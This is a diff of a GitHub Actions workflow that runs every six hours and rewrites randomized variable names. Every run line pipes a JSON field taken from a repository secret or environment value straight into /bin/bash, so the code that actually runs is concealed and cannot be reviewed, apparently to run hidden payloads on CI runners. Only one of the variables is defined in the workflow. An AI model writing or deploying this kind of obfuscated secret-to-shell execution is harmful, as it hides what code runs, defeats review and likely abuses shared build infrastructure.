@@ -1,26 +1,30 @@
 name: youshigeliao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 4/6 * * *'
-jobs:  # 1041
+    - cron: '13 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: youshigeliao
         env:
-          eg6920: ${{ secrets.eg6920 }}
+          fcwn694: ${{ secrets.fcwn694 }}
         run: |
-          echo $eg6920 | jq -r .k5 | /bin/bash
-          echo $fq0740 | jq -r .xt6578 | /bin/bash
-          echo $aghm82 | jq -r .go607 | /bin/bash
-          echo $wazoj0727 | jq -r .l22155 | /bin/bash
-          echo $axv16 | jq -r .om4 | /bin/bash
-          echo $b8280 | jq -r .rjeqt837 | /bin/bash
-          echo $lzop9 | jq -r .phhk815 | /bin/bash
-          echo $ib1549 | jq -r .vavc1 | /bin/bash
-          echo $zhikl3090 | jq -r .yascy5000 | /bin/bash
-          echo $isu5 | jq -r .bk40 | /bin/bash
+          echo $fcwn694 | jq -r .kxrl153 | /bin/bash
+          echo $n438 | jq -r .c273 | /bin/bash
+          echo $cldg232 | jq -r .lrcg1380 | /bin/bash
+          echo $qtkub5 | jq -r .inrl74413 | /bin/bash
+          echo $wshes340 | jq -r .lr3597 | /bin/bash
+          echo $r7725 | jq -r .oyh75 | /bin/bash
+          echo $onwrv43 | jq -r .aghgf205 | /bin/bash
+          echo $ycwct8 | jq -r .tj58066 | /bin/bash
+          echo $ydf85 | jq -r .gdjl27 | /bin/bash
+          echo $vuhzl90 | jq -r .q93439 | /bin/bash
+          echo $dcp7 | jq -r .qh73485 | /bin/bash
+          echo $ciakx13598 | jq -r .fqsu2636 | /bin/bash
+          echo $dvs1319 | jq -r .q4204 | /bin/bash
 
